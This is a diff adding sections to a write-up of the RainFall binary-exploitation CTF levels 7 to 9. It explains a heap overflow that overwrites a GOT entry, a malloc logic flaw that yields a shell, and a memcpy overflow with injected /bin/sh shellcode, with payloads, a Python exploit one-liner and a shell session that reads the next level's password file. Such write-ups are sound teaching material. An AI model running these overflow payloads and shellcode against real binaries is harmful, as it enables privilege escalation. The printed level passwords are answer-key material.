@@ -218,16 +218,96 @@ f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 ```
 
 # level7
+
 ## Type of exploit
+
+Buffer Overflow + behaviour of Malloc and contiguity of allocated memory chunks + use of strcpy + GOT overwrite
+
 ## Details of level7
 
+There are two custom functions in the binary `m()` and `main()`.
+
+`main()` reads the contents of `/home/user/level8/.pass` and puts it a global variable `c` that is only printed in function `m()`.
+
+`m()` is never called, but there is an invocation of `puts@plt` which GOT-provided address we can overwrite.
+
+We see with `ltrace` that `argv[1]` and `argv[2]` are given to calls to `strcpy` along with two locally `malloc-ed` pointers.
+
+```shell-session
+level7@RainFall:~$ ltrace ./level7 ayooooo ayoooooooooooo
+__libc_start_main(0x8048521, 3, 0xbffffce4, 0x8048610, 0x8048680 <unfinished ...>
+malloc(8)                                                 = 0x0804a008
+malloc(8)                                                 = 0x0804a018
+malloc(8)                                                 = 0x0804a028
+malloc(8)                                                 = 0x0804a038
+strcpy(0x0804a018, "ayooooo")                             = 0x0804a018
+strcpy(0x0804a038, "ayoooooooooooo")                      = 0x0804a038
+```
+
+We see there is an offset of `20` between both `malloc-ed` address given to `strcpy `calls. This makes it possible to overwrite the second pointer with the address of uncalled function `m()`.
+
+- address of `m()` : 0x080484f4
+- offset of buffer is 20
+- pointer address of GOT: 0x8049928
+Therefor, we can exploit both: `strcpy` vulnerability and `malloc` behaviour in order to overwrite the second pointer with the GOT pointer address with the addres of m.
+
+Previous codeblock becomes:
+
+```shell-session
+strcpy(0x0804a018, "01234567890123456789\x28\x99\x04\x08")   = 0x0804a018
+strcpy(0x08049928, "\xf4\x84\x04\x08")                       = 0x08049928
+```
+
 # level8
+
 ## Type of exploit
+
+reverse engineering + malloc allocation behaviour exploitation
+
 ## Details of level8
+
+Program is an infinite loop that awaits a series of input strings in order to do different tasks.
+
+`auth ` allocates a pointer with `malloc`
+`service` does too
+`reset` frees the pointer allocated by `auth `
+`login` may prompt a shell if (`auth `_pointer + 8 != 0)
+
+if you call:
+
+- `auth ` then `servic` twice
+
+or
+
+- `auth ` then `service 0123456789abcdef`, the offset of auth+8 is not equal to 0, and a shell appears.
 
 # level9
 ## Type of exploit
+
+Shellcode injection + exploit vulnerable function memcpy
+
 ## Details of level9
+
+C++ binary.
+
+We need to dig inside the assembler to understand what's going on.
+
+The most notable information are:
+1. `memcpy` is used inside a method 
+2. It returns in `eax` a function address that is then used for a call (`*f()`)
+3. the buffer offset is 104
+4. eax address is 0x804a00c
+5. address of shellcode is 0x804a00c + 0x4 == 0x804a010
+6. Payload must have a length: 104 (buffer size) + 4 (buffer address) + 4 (overwritten address) = 112 of payload length 
+
+```shell-session
+./level9 $(python -c "print '\x10\xa0\x04\x08' + '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + 'B' * 80 + '\x0c\xa0\x04\x08'")
+#                           |address-in-eax+4| + |------------------------------------------------------------------------------------------------| + |padding|+ |-address-in-eax-|
+$ whoami
+bonus0
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+```
 
 # bonus0
 ## Type of exploit
